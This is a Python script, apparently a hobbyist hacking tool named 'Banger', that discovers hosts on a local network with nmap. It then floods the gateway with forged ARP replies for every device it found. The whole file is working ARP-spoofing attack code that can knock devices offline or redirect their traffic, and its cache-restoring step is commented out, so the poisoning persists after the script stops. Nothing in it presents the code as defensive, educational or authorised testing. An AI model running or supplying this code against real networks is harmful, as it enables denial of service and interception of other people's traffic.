""" Banger Imports """
import sys
import os
import time
import socket
import nmap
from scapy.layers.l2 import Ether, ARP, srp
from scapy.sendrecv import send


DEVICELIST = []
BANGER = '''
 ▄▄▄▄    ▄▄▄       ███▄    █   ▄████ ▓█████  ██▀███  
▓█████▄ ▒████▄     ██ ▀█   █  ██▒ ▀█▒▓█   ▀ ▓██ ▒ ██▒
▒██▒ ▄██▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▒███   ▓██ ░▄█ ▒
▒██░█▀  ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ ▒██▀▀█▄  
░▓█  ▀█▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒░▒████▒░██▓ ▒██▒
░▒▓███▀▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
▒░▒   ░   ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░  ░▒ ░ ▒░
 ░    ░   ░   ▒      ░   ░ ░ ░ ░   ░    ░     ░░   ░ 
 ░            ░  ░         ░       ░    ░  ░   ░     
      ░                                              
'''

def get_mac(targetip):
    """
    Fetches MAC address for a given IP on the network
    @param targetip: IP address of machine whose MAC address is to be looked up
    """
    arppacket = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
    targetmac = srp(arppacket, timeout=2, verbose=False)[0][0][1].hwsrc
    return targetmac

def get_current_ip():
    """
    Fetches IP Address of the local system's primary interface
    """
    # To get correct IP, Please ensure the adapter is the only one running or statically set it here
    # return "192.168.0.106"
    return socket.gethostbyname(socket.gethostname())

def discover_hosts():
    """
    Runs NMAP on the local network, discovering all hosts
    @param targetip: IP address of machine whose MAC address is to be looked up
    """
    scanner = nmap.PortScanner()
    scanner.scan(hosts="192.168.9.1/24", arguments="-T4 -F")
    discover = scanner.all_hosts()
    # Pop out yourself so you don't get fucked
    try:
        discover.remove(str(gatewayIp))
    except ValueError:
        print("Couldn't find Gateway IP in discovered hosts")
    try:
        discover.remove(get_current_ip())
    except ValueError:
        print("Couldn't find self IP in discovered hosts")
    for host in discover:
        machine = scanner[host]
        ip = machine['addresses']['ipv4']
        mac = machine['addresses']['mac']
        hostname = machine['hostnames'][0]['name']
        try:
            vendor = machine['vendor'][mac]
        except ValueError:
            vendor = ""
        DEVICELIST.append({'ip':ip, 'mac':mac, 'hostname':hostname, 'vendor':vendor})
        print(ip, mac, hostname, vendor)
    confirm()

def spoof_arp_cache(targetip, targetmac, sourceip):
    """
    Spoofs ARP Cache of the target device
    @param targetip: IP address of target machine
    @param targetmac: MAC address of the target machine
    @param sourceip: IP address of source host
    """
    spoofed = ARP(op=2, pdst=targetip, psrc=sourceip, hwdst=targetmac)
    send(spoofed, verbose=False)

def restore_arp(targetip, targetmac, sourceip, sourcemac):
    """
    Restores ARP Cache of targetted device
    @param targetip: IP address of target machine
    @param targetmac: MAC address of the target machine
    @param sourceip: IP address of source host
    @param sourcemac: MAC address of the source host
    """
    packet = ARP(op=2, hwsrc=sourcemac, psrc=sourceip, hwdst=targetmac, pdst=targetip)
    send(packet, verbose=False)
    print("ARP Table restored to normal for", targetip)

def confirm():
    """
    NMAP fucks up sometimes, so a simple confirmation to verify a good amount of hosts have been
    detected
    """
    print("\n\n\n")
    print("Is the list acceptable (y/n) ?")
    char = input()
    if char == 'y':
        return False
    discover_hosts()

def main():
    """
    Main function
    """
    os.system('cls')
    print(BANGER)
    print("\n\n")
    print("Enter your Gateway IP")
    global gatewayIp
    global gatewayMac
    gatewayIp = input()
    gatewayMac = get_mac(gatewayIp)
    discover_hosts()
    os.system('cls')
    print(BANGER)
    time.sleep(1)
    try:
        print("Starting the banging, prepare your .... \n\n")
        while True:
            for device in DEVICELIST:
                #spoofarpcache(targetip, targetmac, gatewayip)
                spoof_arp_cache(gatewayIp, gatewayMac, device['ip'])
            time.sleep(1)
    except KeyboardInterrupt:
        print("ARP spoofing stopped")
        #for device in deviceList:
        #restorearp(gatewayip, gatewaymac, targetip, targetmac)
        #restorearp(device['ip'], targetmac, gatewayip, device['ip'])
        sys.exit()

if __name__ == "__main__":
    gatewayIp = None
    gatewayMac = None
    main()
